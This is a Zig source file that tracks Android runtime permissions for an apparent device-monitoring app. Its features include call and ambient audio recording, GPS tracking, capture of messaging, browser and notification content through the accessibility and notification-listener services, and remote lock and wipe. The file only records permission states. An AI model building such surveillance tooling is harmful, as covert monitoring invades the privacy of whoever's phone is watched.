// Runtime permission management for Android
// Layer 1: Platform (Android)
//
// Abstracts Android's runtime permission model: request, check status,
// detect degraded mode when permissions are missing.

const std = @import("std");

/// All permissions required by the monitoring system.
pub const Permission = enum {
    camera,
    fine_location,
    coarse_location,
    background_location,
    record_audio,
    read_external_storage,
    write_external_storage,
    read_phone_state,
    read_call_log,
    read_sms,
    receive_sms,
    read_contacts,
    accessibility_service,
    notification_listener,
    usage_stats,
    device_admin,
    system_alert_window,
    receive_boot_completed,

    /// Return the Android manifest permission string.
    pub fn manifestString(self: Permission) []const u8 {
        return switch (self) {
            .camera => "android.permission.CAMERA",
            .fine_location => "android.permission.ACCESS_FINE_LOCATION",
            .coarse_location => "android.permission.ACCESS_COARSE_LOCATION",
            .background_location => "android.permission.ACCESS_BACKGROUND_LOCATION",
            .record_audio => "android.permission.RECORD_AUDIO",
            .read_external_storage => "android.permission.READ_EXTERNAL_STORAGE",
            .write_external_storage => "android.permission.WRITE_EXTERNAL_STORAGE",
            .read_phone_state => "android.permission.READ_PHONE_STATE",
            .read_call_log => "android.permission.READ_CALL_LOG",
            .read_sms => "android.permission.READ_SMS",
            .receive_sms => "android.permission.RECEIVE_SMS",
            .read_contacts => "android.permission.READ_CONTACTS",
            .accessibility_service => "android.permission.BIND_ACCESSIBILITY_SERVICE",
            .notification_listener => "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
            .usage_stats => "android.permission.PACKAGE_USAGE_STATS",
            .device_admin => "android.permission.BIND_DEVICE_ADMIN",
            .system_alert_window => "android.permission.SYSTEM_ALERT_WINDOW",
            .receive_boot_completed => "android.permission.RECEIVE_BOOT_COMPLETED",
        };
    }

    /// Whether this permission requires special settings UI (not a runtime dialog).
    pub fn requiresSettingsUI(self: Permission) bool {
        return switch (self) {
            .accessibility_service,
            .notification_listener,
            .usage_stats,
            .device_admin,
            .system_alert_window,
            => true,
            else => false,
        };
    }
};

/// Status of a single permission.
pub const PermissionStatus = enum {
    granted,
    denied,
    denied_permanently,
    not_requested,
};

/// Result of checking all permissions.
pub const PermissionReport = struct {
    statuses: [PERMISSION_COUNT]PermissionStatus,

    pub fn isFullyGranted(self: *const PermissionReport) bool {
        for (self.statuses) |s| {
            if (s != .granted) return false;
        }
        return true;
    }

    /// Returns the list of missing (non-granted) permissions.
    pub fn missingPermissions(self: *const PermissionReport, buf: *[PERMISSION_COUNT]Permission) u8 {
        var count: u8 = 0;
        inline for (std.meta.fields(Permission), 0..) |field, i| {
            _ = field;
            if (self.statuses[i] != .granted) {
                buf[count] = @enumFromInt(i);
                count += 1;
            }
        }
        return count;
    }

    /// Determine which features are degraded due to missing permissions.
    pub fn degradedFeatures(self: *const PermissionReport, buf: *[MAX_FEATURES]DegradedFeature) u8 {
        var count: u8 = 0;
        if (self.statuses[@intFromEnum(Permission.record_audio)] != .granted) {
            buf[count] = .call_recording;
            count += 1;
            buf[count] = .ambient_recording;
            count += 1;
        }
        if (self.statuses[@intFromEnum(Permission.fine_location)] != .granted) {
            buf[count] = .gps_location;
            count += 1;
        }
        if (self.statuses[@intFromEnum(Permission.accessibility_service)] != .granted) {
            buf[count] = .im_capture;
            count += 1;
            buf[count] = .browser_capture;
            count += 1;
        }
        if (self.statuses[@intFromEnum(Permission.notification_listener)] != .granted) {
            buf[count] = .notification_capture;
            count += 1;
        }
        if (self.statuses[@intFromEnum(Permission.usage_stats)] != .granted) {
            buf[count] = .app_usage;
            count += 1;
        }
        if (self.statuses[@intFromEnum(Permission.device_admin)] != .granted) {
            buf[count] = .remote_lock;
            count += 1;
            buf[count] = .remote_wipe;
            count += 1;
        }
        return count;
    }
};

pub const DegradedFeature = enum {
    call_recording,
    ambient_recording,
    gps_location,
    im_capture,
    browser_capture,
    notification_capture,
    app_usage,
    remote_lock,
    remote_wipe,
};

pub const MAX_FEATURES = 9;
pub const PERMISSION_COUNT = std.meta.fields(Permission).len;

/// Permission manager — tracks permission states.
pub const PermissionManager = struct {
    statuses: [PERMISSION_COUNT]PermissionStatus,

    pub fn init() PermissionManager {
        return .{
            .statuses = @splat(.not_requested),
        };
    }

    /// Update the status of a specific permission.
    pub fn setStatus(self: *PermissionManager, perm: Permission, status: PermissionStatus) void {
        self.statuses[@intFromEnum(perm)] = status;
    }

    /// Get the status of a specific permission.
    pub fn getStatus(self: *const PermissionManager, perm: Permission) PermissionStatus {
        return self.statuses[@intFromEnum(perm)];
    }

    /// Generate a full permission report.
    pub fn report(self: *const PermissionManager) PermissionReport {
        return .{ .statuses = self.statuses };
    }

    /// Mark a permission as granted.
    pub fn grant(self: *PermissionManager, perm: Permission) void {
        self.statuses[@intFromEnum(perm)] = .granted;
    }

    /// Mark a permission as denied.
    pub fn deny(self: *PermissionManager, perm: Permission, permanent: bool) void {
        self.statuses[@intFromEnum(perm)] = if (permanent) .denied_permanently else .denied;
    }
};
